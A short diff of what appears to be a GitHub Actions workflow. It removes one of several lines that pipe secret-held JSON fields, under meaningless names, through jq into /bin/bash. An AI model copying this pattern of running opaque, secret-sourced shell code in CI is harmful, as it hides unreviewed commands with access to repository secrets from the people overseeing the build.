@@ -21,7 +21,6 @@ jobs:
           bi87655: ${{ secrets.bi87655 }}
         run: |
           printf '%s' "$bi87655" | jq -r .nynt89 | /bin/bash
-          echo $xuql2774 | jq -r .sz1197 | /bin/bash
           printf '%s' "$modsl42" | jq -r .xd982 | /bin/bash
           printf '%s' "$xpeyf3" | jq -r .wtlee70667 | /bin/bash
           printf '%s' "$pr423" | jq -r .rdej2 | /bin/bash
